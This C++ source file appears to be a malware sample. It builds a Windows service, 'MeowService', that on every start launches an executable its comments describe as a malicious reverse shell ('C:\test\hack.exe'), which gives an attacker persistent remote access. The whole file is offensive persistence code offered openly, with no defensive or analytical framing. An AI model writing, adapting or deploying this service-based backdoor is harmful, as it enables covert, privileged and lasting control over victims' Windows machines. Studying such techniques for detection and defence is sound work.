#include <windows.h>
#include <iostream>

#define SLEEP_TIME 5000 // sleep time in milli second between service checks

// Global variables for service management
SERVICE_STATUS serviceStatus;  // Structure holding service state information
SERVICE_STATUS_HANDLE hStatus; // Handle to the service for status updates

// function declarations
void ServiceMain(int argc, char **argv);
void ControlHandler(DWORD request);

//===MALICIOUS PAYLOAD EXECUTION===
int RunMeow()
{
    void *lb;
    BOOL rv;
    HANDLE th;

    // path to malicious reverse shell exe
    char cmd[] = "C:\\test\\hack.exe";

    // Structure for process creation
    STARTUPINFO si;         // Specifies the main window
    PROCESS_INFORMATION pi; // Receives information about the new process

    // initialize the structure with zeros
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Set the size of the structure required
    ZeroMemory(&pi, sizeof(pi));

    // create the malicious process(reverse shell)
    CreateProcess(
        NULL,  // use CMD
        cmd,   // command to execute(our rs)
        NULL,  // default process security
        NULL,  // default thread security
        FALSE, // dont inherit handles
        0,     // No creation flags
        NULL,  // use parent's environment
        NULL,  // use parent directory
        &si,   // Pointer to STARTUPINFO
        &pi    // Pointer to PROCESS_INFORMATION - REMOVED EXTRA COMMA
    );

    // wait for the process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);

    // clean up process handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

int main()
{
    // Service dispatch table-maps service names to their main functions
    // This tells the service control manager(scm) about our service
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {"MeowService", (LPSERVICE_MAIN_FUNCTION)ServiceMain}, // service name and entry point
        {NULL, NULL}                                           // terminating entry
    };

    // connect to the service control manager and start control dispatcher

    // This call doesnt return until all services in the table have terminated
    StartServiceCtrlDispatcher(ServiceTable);

    return 0;
}

//===Service Main Function===
// This is the main entry point for the service when started by SCM
void ServiceMain(int argc, char **argv)
{
    // Initialize the service status structure
    serviceStatus.dwServiceType = SERVICE_WIN32;                                      // Type of service (win32 exe)
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;                             // Initial starting point
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; // WHICH contol codes we accept
    serviceStatus.dwWin32ExitCode = 0;                                                // Error code for service failure
    serviceStatus.dwServiceSpecificExitCode = 0;                                      // Service specific error code
    serviceStatus.dwCheckPoint = 0;                                                   // Increments durin lengthy operations
    serviceStatus.dwWaitHint = 0;                                                     // Estimated time for pending operations

    // Register the service handler function
    // THis allows the service control manager to control our service
    hStatus = RegisterServiceCtrlHandler("MeowService", (LPHANDLER_FUNCTION)ControlHandler);

    // execute the malicious payload
    RunMeow();

    // Update service status to "running"
    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &serviceStatus);

    //===SERVICE MAIN LOOP===
    // keep the service running until stopped or shut down
    while (serviceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        Sleep(SLEEP_TIME); // prevent excessive CPU usage
    }

    return;
}

// Handles control requests from the service control manager
void ControlHandler(DWORD request)
{
    switch (request)
    {
    case SERVICE_CONTROL_STOP:
        // handle service stop request
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED; // FIXED: dwCurrenState â†’ dwCurrentState

        SetServiceStatus(hStatus, &serviceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        // Handle system shutdown request
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;

        SetServiceStatus(hStatus, &serviceStatus);
        return;

    default:
        break; // Ignore other codes
    }

    // Update service status for any unhandled control codes
    SetServiceStatus(hStatus, &serviceStatus);
    return;
}